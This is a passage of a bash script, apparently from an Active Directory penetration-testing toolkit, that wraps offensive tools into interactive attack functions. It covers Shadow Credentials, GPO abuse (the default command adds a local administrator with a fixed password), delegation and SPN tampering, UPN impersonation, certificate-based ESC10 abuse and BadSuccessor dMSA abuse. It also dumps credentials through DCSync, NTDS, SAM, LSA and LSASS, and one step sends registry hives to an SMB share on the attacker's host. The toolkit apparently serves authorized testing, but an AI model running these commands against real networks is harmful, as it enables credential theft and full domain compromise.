            echo -e "${CYAN}[*] Example: user01 or DC01$ ${NC}"
            target_shadowcreds=""
            read -rp ">> " target_shadowcreds </dev/tty
            while [ "${target_shadowcreds}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_shadowcreds </dev/tty
            done
            echo -e "${CYAN}[*] Performing ShadowCredentials attack against ${target_shadowcreds}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_shadowcreds}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_shadowcreds}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

shadowcreds_delete() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Removing added ShadowCredentials from target. Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: user01 or DC01$ ${NC}"
            target_shadowcreds=""
            read -rp ">> " target_shadowcreds </dev/tty
            while [ "${target_shadowcreds}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_shadowcreds </dev/tty
            done
            key_shadowcreds=""
            echo -e "${CYAN}[*] Please specify Key Credentials to remove (default: all Keys) ${NC}"
            read -rp ">> " key_shadowcreds </dev/tty
            if [ ! "${key_shadowcreds}" == "" ]; then
                key_param_shadowcreds="--key ${key_shadowcreds}"
            else
                key_param_shadowcreds=""
            fi
            echo -e "${CYAN}[*] Removing Key Credentials from ${target_shadowcreds}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove shadowCredentials ${key_param_shadowcreds} '${target_shadowcreds}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

pygpo_abuse() {
    if ! stat "${pygpoabuse}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of pygpoabuse${NC}"
    elif [ "${nullsess_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
        echo -e "${PURPLE}[-] pygpoabuse requires credentials and does not support Kerberos authentication using AES Key${NC}"
    else
        echo -e "${BLUE}[*] Using modification rights on GPO to execute command. Please specify GPO ID${NC}"
        echo -e "${CYAN}[*] Example: 31a09564-cd4a-4520-98fa-446a2af23b4b ${NC}"
        target_gpoabuse=""
        read -rp ">> " target_gpoabuse </dev/tty
        while [ "${target_gpoabuse}" == "" ]; do
            echo -e "${RED}Invalid ID.${NC} Please specify GPO ID:"
            read -rp ">> " target_gpoabuse </dev/tty
        done
        target_userbool=""
        echo -e "${BLUE}[*] Please type 'user' if you wish to set user GPO or 'computer' to set computer GPO${NC}"
        read -rp ">> " target_userbool </dev/tty
        while [ "${target_userbool}" != "user" ] && [ "${target_userbool}" != "computer" ]; do
            echo -e "${RED}Invalid input.${NC} Please choose between 'user' and 'computer':"
            read -rp ">> " target_userbool </dev/tty
        done
        if [ "${target_userbool}" == "user" ]; then
            echo -e "${YELLOW}[!] User GPO chosen!${NC}"
            userbool_gpoabuse="-user"
        else
            echo -e "${YELLOW}[!] Computer GPO chosen!${NC}"
            userbool_gpoabuse=""
        fi
        command_gpoabuse=""
        echo -e "${BLUE}[*] Please specify command to execute. Press enter to use default: create user john with password 'H4x00r123..' as local administrator${NC}"
        read -rp ">> " command_input_gpoabuse </dev/tty
        if [ ! "${command_input_gpoabuse}" == "" ]; then command_gpoabuse="-command ${command_input_gpoabuse}"; fi
        if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
        run_command "${python3} ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id ${target_gpoabuse} ${userbool_gpoabuse} ${command_gpoabuse}" 2>&1 | tee -a "${Modification_dir}/pygpoabuse_output_${user_var}.txt"
    fi
    echo -e ""
}

add_unconstrained() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding Unconstrained Delegation rights on owned account. Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: DC01 or FILE01 ${NC}"
            target_unconsdeleg=""
            read -rp ">> " target_unconsdeleg </dev/tty
            while [ "${target_unconsdeleg}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_unconsdeleg </dev/tty
            done
            echo -e "${CYAN}[*] Adding Unconstrained Delegation rights to ${target_unconsdeleg}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_unconsdeleg}$' -f TRUSTED_FOR_DELEGATION" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_unconsdeleg_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

add_spn() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding CIFS and HTTP SPNs to owned computer account. Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: DC01 or FILE01 ${NC}"
            target_spn=""
            read -rp ">> " target_spn </dev/tty
            while [ "${target_spn}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_spn </dev/tty
            done
            echo -e "${CYAN}[*] Adding CIFS and HTTP SPNs to ${target_spn}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' ServicePrincipalName -v 'HOST/${target_spn}' -v 'HOST/${target_spn}.${domain}' -v 'RestrictedKrbHost/${target_spn}' -v 'RestrictedKrbHost/${target_spn}.${domain}' -v 'CIFS/${target_spn}.${domain}' -v 'HTTP/${target_spn}.${domain}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_${dc_domain}.txt"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' msDS-AdditionalDnsHostName -v '${target_spn}.${domain}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_${dc_domain}.txt"
            if grep -q -a "has been updated" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_${dc_domain}.txt"; then
                echo -e "${GREEN}[+] Adding CIFS and HTTP SPNs successful! Run command below to perform Kerberos relay attack${NC}"
                echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${target_spn}.${domain} --dc-ip $dc_ip"
                echo -e "${python3} krbrelayx-master/krbrelayx.py -hashes :< NTLM hash of computer account >"
            fi
        fi
    fi
    echo -e ""
}

add_upn() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding userPrincipalName to owned user account. Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: user01 ${NC}"
            target_upn=""
            read -rp ">> " target_upn </dev/tty
            while [ "${target_upn}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_upn </dev/tty
            done
            value_upn=""
            echo -e "${BLUE}[*] Adding userPrincipalName to ${target_upn}. Please specify user to impersonate:${NC}"
            echo -e "${CYAN}[*] Example: user02 ${NC}"
            read -rp ">> " value_upn </dev/tty
            while [ "${value_upn}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify value of upn:"
                read -rp ">> " value_upn </dev/tty
            done
            echo -e "${CYAN}[*] Adding UPN ${value_upn} to ${target_upn}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_upn}' userPrincipalName -v '${value_upn}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_upn_${dc_domain}.txt"
            if grep -q -a "has been updated" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_upn_${dc_domain}.txt"; then
                echo -e "${GREEN}[+] Adding UPN successful!${NC}"
                echo -e "${BLUE}[*] Please specify NTLM hash of ${target_upn}. Press ENTER to retrieve target's NT hash using Shadow Credentials:${NC}"
                target_upn_hash=""
                read -rp ">> " target_upn_hash </dev/tty
                if [ -z "$target_upn_hash" ]; then
                    if [ "${ldaps_bool}" == true ]; then ldaps_param_ba="-s"; else ldaps_param_ba=""; fi
                    run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param_ba} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_upn}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_upn}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
                    target_upn_hash=$(grep ${target_upn} "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt" -A 2| grep '^NT:' | tail -n 1 | cut -d ' ' -f 2 | tr -d ' \r\n')
                fi
                if [ -z "$target_upn_hash" ] || ! ([[ (${#target_upn_hash} -eq 65 && "${target_upn_hash:32:1}" == ":") || (${#target_upn_hash} -eq 33 && "${target_upn_hash:0:1}" == ":") || (${#target_upn_hash} -eq 32) ]]); then
                    echo -e "${RED}[-] Invalid NT hash of '${target_upn}'. Aborting... ${NC}"
                else
                    echo -e "${BLUE}[*] Generating Kerberos ticket of impersonated user:${NC}"
                    current_dir=$(pwd)
                    cd "${Credentials_dir}" || exit
                    run_command "${impacket_getTGT} -principal NT_ENTERPRISE ${domain}/${value_upn} -hashes :${target_upn_hash} -dc-ip ${dc_ip}"
                    cd "${current_dir}" || exit
                    if stat "${Credentials_dir}/${value_upn//\$/}.ccache" >/dev/null 2>&1; then
                        echo -e "\n${GREEN}[+] Authenticate using ccache of impersonated Admin:${NC}"
                        echo -e "linWinPwn -t ${dc_ip} -d ${domain} -u '${value_upn}' -K '${Credentials_dir}/${value_upn//\$/}.ccache'"
                        echo -e "_OR_"
                        echo -e "export KRB5CCNAME='${Credentials_dir}/${value_upn//\$/}.ccache'"
                        echo -e "ksu ${value_upn}"
                    fi
                fi
            fi
        fi
    fi
    echo -e ""
}

add_upn_esc10() {
    if ! stat "${certipy}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
            if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
            echo -e "\n${YELLOW}[!] Manually check for ESC10 vulnerability by querying the registry:${NC}"
            echo -e "reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
            echo -e "CertificateMappingMethods    REG_DWORD    0x4 ${GREEN}<== VULNERABLE${NC}"
            echo -e "${YELLOW}[*] If vulnerable to ESC10, press ENTER to continue....${NC}"
            read -rp "" </dev/tty
            echo -e "${BLUE}[*] Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: user01 ${NC}"
            target_upn=""
            read -rp ">> " target_upn </dev/tty
            while [ "${target_upn}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_upn </dev/tty
            done
            echo -e "${BLUE}[*] Please specify NTLM hash of ${target_upn}. Press ENTER to retrieve target's NT hash using Shadow Credentials:${NC}"
            target_upn_hash=""
            read -rp ">> " target_upn_hash </dev/tty
            if [ -z "$target_upn_hash" ]; then
                if [ "${ldaps_bool}" == true ]; then ldaps_param_ba="-s"; else ldaps_param_ba=""; fi
                run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param_ba} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_upn}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_upn}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
                target_upn_hash=$(grep ${target_upn} "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt" -A 2| grep '^NT:' | tail -n 1 | cut -d ' ' -f 2 | tr -d ' \r\n')
            fi
            if [ -z "$target_upn_hash" ] || ! ([[ (${#target_upn_hash} -eq 65 && "${target_upn_hash:32:1}" == ":") || (${#target_upn_hash} -eq 33 && "${target_upn_hash:0:1}" == ":") || (${#target_upn_hash} -eq 32) ]]); then 
                echo -e "${RED}[-] Invalid NT hash of '${target_upn}'. Aborting... ${NC}"
            else
                ne_adcs_enum
                value_upn=""
                echo -e "${BLUE}[*] Modifying userPrincipalName of ${target_upn}. Please specify user/machine to impersonate:${NC}"
                echo -e "${CYAN}[*] Example: user02, DC$ ${NC}"
                read -rp ">> " value_upn </dev/tty
                while [ "${value_upn}" == "" ]; do
                    echo -e "${RED}Invalid name.${NC} Please specify value of upn:"
                    read -rp ">> " value_upn </dev/tty
                done
                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn '${value_upn}'@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
                echo -e "${BLUE}[*] Requesting certificate permitting client authentication for ${target_upn}.${NC}"
                pki_server=$(echo -e "$pki_servers" | sed 's/ /\n/g' | sed -n ${1}p)
                pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${1}p)
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                if [ "${kerb_bool}" == true ]; then krb_upn="KRB5CCNAME=''"; krb_param="-k"; else krb_upn=""; krb_param=""; fi
                run_command "${krb_upn} ${certipy} req -u ${target_upn}@${dc_domain} -hashes ${target_upn_hash} ${krb_param} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapbindsign_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
                cd "${current_dir}" || exit
                echo -e "${BLUE}[*] Modifying userPrincipalName of ${target_upn} back to original value.${NC}"
                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn ${target_upn}@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
                if stat "${Credentials_dir}/${value_upn//\$/}.pfx" >/dev/null 2>&1; then
                    echo -e "\n${GREEN}[+] Authenticate using pfx of impersonated Admin or DC:${NC}"
                    echo -e "${certipy} auth -pfx ${Credentials_dir}/${value_upn//\$/}.pfx -dc-ip ${dc_ip} ${ldaps_param} [-ldap-shell]"
                fi
            fi
        fi
    fi
    echo -e ""
}

add_constrained() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding Constrained Delegation rights on owned account. Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: DC01 or FILE01 ${NC}"
            target_consdeleg=""
            read -rp ">> " target_consdeleg </dev/tty
            while [ "${target_consdeleg}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_consdeleg </dev/tty
            done
            echo -e "${CYAN}[*] Adding Constrained Delegation rights to ${target_consdeleg}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_consdeleg}$' -f TRUSTED_TO_AUTH_FOR_DELEGATION" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_consdeleg_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

add_spn_constrained() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding SPNs of Domain Controller to owned computer account (msDS-AllowedToDelegateTo). Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: DC01 or FILE01${NC}"
            target_spn=""
            read -rp ">> " target_spn </dev/tty
            while [ "${target_spn}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_spn </dev/tty
            done
            echo -e "${CYAN}[*] Adding DC HOST and LDAP SPNs to ${target_spn}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' msDS-AllowedToDelegateTo -v 'HOST/${dc_NETBIOS}' -v 'HOST/${dc_FQDN}' -v 'LDAP/${dc_NETBIOS}' -v 'LDAP/${dc_FQDN}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_const_${dc_domain}.txt"
            if grep -q -a "has been updated" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_const_${dc_domain}.txt"; then
                echo -e "${GREEN}[+] Adding DC SPNs successful! Run command below to generate impersonated ticket ${NC}"
                echo -e "${impacket_getST} -spn '< HOST/${dc_FQDN} OR LDAP/${dc_FQDN} >' -impersonate ${dc_NETBIOS} ${domain}/'${target_spn}$':'< password of ${target_spn} >'"
            fi
        fi
    fi
    echo -e ""
}

badsuccessor_adddmsa() {
    if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of impacket{NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] badsuccessor.py requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Please specify name of writeable OU:${NC}"
            echo -e "${CYAN}[*] Example: OU=ServiceAccounts,DC=domain,DC=local${NC}"
            read -rp ">> " target_ou </dev/tty
            while [ "${target_ou}" == "" ]; do
                echo -e "${RED}Invalid OU.${NC} Please specify name of OU:"
                read -rp ">> " target_ou </dev/tty
            done
            dmsa_name="bad_DMSA"
            target_dmsa="Administrator"
            imp_dmsa="${user}"
            echo -e "${BLUE}[*] Adding dMSA to writeable OU. Please specify name of dMSA object (press Enter to choose default value 'bad_DMSA'):${NC}"
            read -rp ">> " dmsa_name_add </dev/tty
            if [[ ! ${dmsa_name_add} == "" ]]; then dmsa_name="${dmsa_name_add}"; fi
            echo -e "${BLUE}[*] Please specify name of admin to impersonate (press Enter to choose default value 'Administrator'):${NC}"
            read -rp ">> " target_dmsa_temp </dev/tty
            if [[ ! ${target_dmsa_temp} == "" ]]; then target_dmsa="${target_dmsa_temp}"; fi
            echo -e "${BLUE}[*] Please specify name of user under your control (press Enter to choose default value current user):${NC}"
            read -rp ">> " imp_dmsa_temp </dev/tty
            if [[ ! ${imp_dmsa_temp} == "" ]]; then imp_dmsa="${imp_dmsa_temp}"; fi
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-method LDAPS"; else ldaps_param="-method LDAP"; fi
            echo -e "${CYAN}[*] Adding dMSA named ${dmsa_name} to ${target_ou}${NC}"
            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${ldaps_param} -action add  -dmsa-name '${dmsa_name}' -target-ou '${target_ou}' -target-account '${target_dmsa}' -principals-allowed '${imp_dmsa}'" 2>&1 | tee -a "${Modification_dir}/badsuccessor_adddmsa_${user_var}.txt"
        fi
    fi
    echo -e ""
}

badsuccessor_deletedmsa() {
    if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of impacket{NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] badsuccessor.py requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Please specify name of writeable OU:${NC}"
            echo -e "${CYAN}[*] Example: OU=ServiceAccounts,DC=domain,DC=local${NC}"
            read -rp ">> " target_ou </dev/tty
            while [ "${target_ou}" == "" ]; do
                echo -e "${RED}Invalid OU.${NC} Please specify name of OU:"
                read -rp ">> " target_ou </dev/tty
            done
            dmsa_name="bad_DMSA"
            echo -e "${BLUE}[*] Removing dMSA from writeable OU. Please specify name of dMSA object (press Enter to choose default value 'bad_DMSA'):${NC}"
            read -rp ">> " dmsa_name_delete </dev/tty
            if [[ ! ${dmsa_name_delete} == "" ]]; then dmsa_name="${dmsa_name_delete}"; fi
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-method LDAPS"; else ldaps_param="-method LDAP"; fi
            echo -e "${CYAN}[*] Removing dMSA named ${dmsa_name} from ${target_ou}${NC}"
            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${ldaps_param} -action delete -dmsa-name '${dmsa_name}' -target-ou '${target_ou}'" 2>&1 | tee -a "${Modification_dir}/badsuccessor_deletedmsa_${user_var}.txt"
        fi
    fi
    echo -e ""
}

###### pwd_dump: Password Dump
juicycreds_dump() {
    echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
    for i in $(/bin/cat "${curr_targets_list}"); do
        echo -e "${CYAN}[*] Searching in ${i} ${NC}"
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M keepass_discover -M rdcman -M teams_localdb -M wifi -M winscp -M snipped -M powershell_history -M mremoteng -M iis -M vnc -M eventlog_creds -M notepad++ -M notepad --log ${Credentials_dir}/keepass_discover_${user_var}_${i}.txt" 2>&1
    done
    echo -e ""
}

laps_dump() {
    echo -e "${BLUE}[*] LAPS Dump${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M laps --kdcHost ${dc_FQDN} --log ${Credentials_dir}/laps_dump_${user_var}.txt" 2>&1
    echo -e ""
}

gmsa_dump() {
    echo -e "${BLUE}[*] gMSA Dump${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
    else
        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --gmsa --log ${Credentials_dir}/gMSA_dump_${user_var}.txt" 2>&1
    fi
    echo -e ""
}

secrets_dump_dcsync() {
    if ! stat "${impacket_secretsdump}" >/dev/null 2>&1; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Performing DCSync using secretsdump${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
        else
            run_command "${impacket_secretsdump} ${argument_imp}\\@${target} -just-dc" | tee "${Credentials_dir}/dcsync_${user_var}.txt"
        fi
    fi
    echo -e ""
}

secrets_dump() {
    if ! stat "${impacket_secretsdump}" >/dev/null 2>&1; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Dumping credentials using secretsdump${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] secretsdump requires credentials${NC}"
        else
            for i in $(/bin/cat "${curr_targets_list}"); do
                echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
                run_command "${impacket_secretsdump} ${argument_imp}\\@${i} -dc-ip ${dc_ip}" | tee "${Credentials_dir}/secretsdump_${user_var}_${i}.txt"
            done
        fi
    fi
    echo -e ""
}

samsystem_dump() {
    if ! stat "${impacket_reg}" >/dev/null 2>&1; then
        echo -e "${RED}[-] reg.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Extraction SAM SYSTEM and SECURITY using reg${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] reg requires credentials${NC}"
        else
            set_attackerIP
            echo -e "${YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....${NC}"
            echo -e "${impacket_smbserver} -ip ${attacker_IP} -smb2support lwpshare ${Credentials_dir}/"
            read -rp "" </dev/tty
            for i in $(/bin/cat "${curr_targets_list}"); do
                echo -e "${CYAN}[*] reg save of ${i} ${NC}"
                mkdir -p "${Credentials_dir}/SAMDump_${user_var}/${i}"
                run_command "${impacket_reg} ${argument_imp}\\@${i} -dc-ip ${dc_ip} backup -o \\\\\\${attacker_IP}\\lwpshare\\SAMDump_${user_var}\\$i" | tee "${Credentials_dir}/SAMDump_${user_var}/regsave_${dc_domain}_${i}.txt"
            done
        fi
    fi
    echo -e ""
}

ntds_dump() {
    echo -e "${BLUE}[*] Dumping NTDS using netexec${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] NTDS dump requires credentials${NC}"
    else
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --ntds --log ${Credentials_dir}/ntds_dump_${user_var}.txt" 2>&1
    fi
    echo -e ""
}

samlsa_dump() {
    echo -e "${BLUE}[*] Dumping LSA SAM credentials (secdump) ${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSA SAM dump requires credentials${NC}"
    else
        for i in $(/bin/cat "${curr_targets_list}"); do
            echo -e "${CYAN}[*] SAM LSA dump of ${i} ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam secdump --log ${Credentials_dir}/sam_dump_${user_var}_${i}.txt" 2>&1
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa secdump --log ${Credentials_dir}/lsa_dump_${user_var}_${i}.txt" 2>&1

        done
    fi
    echo -e ""
}

samlsa_reg_dump() {
    echo -e "${BLUE}[*] Dumping LSA SAM credentials (regdump) ${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSA SAM dump requires credentials${NC}"
    else
        for i in $(/bin/cat "${curr_targets_list}"); do
            echo -e "${CYAN}[*] SAM LSA dump of ${i} ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam regdump --log ${Credentials_dir}/sam_reg_dump_${user_var}_${i}.txt" 2>&1
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa regdump --log ${Credentials_dir}/lsa_reg_dump_${user_var}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

lsassy_dump() {
    echo -e "${BLUE}[*] Dumping LSASS using lsassy${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        for i in $(/bin/cat "${curr_targets_list}"); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M lsassy --log ${Credentials_dir}/lsass_dump_lsassy_${user_var}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

handlekatz_dump() {
    echo -e "${BLUE}[*] Dumping LSASS using handlekatz${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        for i in $(/bin/cat "${curr_targets_list}"); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M handlekatz --log ${Credentials_dir}/lsass_dump_handlekatz_${user_var}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

procdump_dump() {
    echo -e "${BLUE}[*] Dumping LSASS using procdump${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
